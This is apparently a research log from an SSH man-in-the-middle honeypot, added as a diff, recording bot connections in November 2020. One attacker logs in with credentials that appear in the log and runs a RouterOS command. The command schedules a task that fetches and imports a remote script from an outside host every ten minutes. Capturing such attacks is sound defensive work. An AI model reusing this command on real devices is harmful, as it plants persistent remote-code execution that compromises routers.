@@ -1,0 +1,24 @@
+2020-11-09 02:20:36.874 - [Info] MITM Version: 1.26
+2020-11-09 02:20:36.878 - [Info] Auto Access Enabled: true
+2020-11-09 02:20:36.879 - [Debug] [Init] Auto Access Barrier: true
+2020-11-09 02:20:36.892 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-09 04:32:56.086 - [Debug] [Connection] Attacker connected: 205.185.115.228 | Client Identification: SSH-2.0-libssh-0.1
+2020-11-09 04:32:56.162 - [Debug] [Connection] Attacker closed the connection
+2020-11-09 05:10:13.855 - [Debug] [Connection] Attacker connected: 38.86.94.12 | Client Identification: SSH-2.0-libssh-0.5.2
+2020-11-09 05:10:13.926 - [Debug] [Connection] Attacker closed the connection
+2020-11-09 08:09:19.914 - [Debug] [Connection] Attacker connected: 49.144.68.120 | Client Identification: SSH-2.0-Go
+2020-11-09 08:09:21.775 - [Debug] [Auth] Attacker 49.144.68.120 trying to authenticate with "none"
+2020-11-09 08:09:21.775 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-11-09 08:09:22.810 - [Debug] [Auth] Attacker 49.144.68.120 trying to authenticate with "password"
+2020-11-09 08:09:22.811 - [Debug] [Auto Access] Attacker: 49.144.68.120, Threshold: 1, Attempts: 1
+2020-11-09 08:09:22.811 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-09 08:09:22.811 - [Debug] [Auto Access] Adding the following credentials: "nagesh:Zte521"
+2020-11-09 08:09:23.027 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-09 08:09:23.027 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-09 08:09:23.055 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-09 08:09:24.965 - [Debug] [EXEC] Noninteractive mode attacker command: /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://strtbiz.site/poll/8268ee2f-5229-4129-85e3-c132c36538b7 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2020-11-09 08:09:25.631 - [Debug] [Connection] Attacker closed connection
+2020-11-09 08:09:25.634 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-09 08:09:25.635 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-09 08:14:24.338 - [Info] Exiting...
+2020-11-09 08:14:24.338 - [Debug] Cleaning up...
